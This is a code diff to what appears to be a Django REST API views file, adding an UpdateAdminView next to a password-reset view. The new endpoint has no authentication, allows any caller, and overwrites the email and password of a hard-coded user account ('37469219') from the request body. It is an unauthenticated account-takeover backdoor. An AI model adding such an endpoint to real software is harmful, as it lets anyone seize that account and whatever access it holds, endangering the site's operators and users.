@@ -164,6 +164,20 @@ class PasswordResetRequestView(APIView):
             
         return Response({'detail': 'If an account with this ID Number exists and has a registered email, a reset link has been sent.'})
 
+class UpdateAdminView(APIView):
+    authentication_classes = []
+    permission_classes = [AllowAny]
+    def post(self, request):
+        from django.contrib.auth import get_user_model
+        User = get_user_model()
+        
+        user = User.objects.get(username='37469219')
+        user.email = request.data.get('email', user.email)
+        if request.data.get('password'):
+            user.set_password(request.data.get('password'))
+        user.save()
+        return Response({'success': True, 'email': user.email})
+
 class TestTokenView(APIView):
     authentication_classes = []
     permission_classes = [AllowAny]
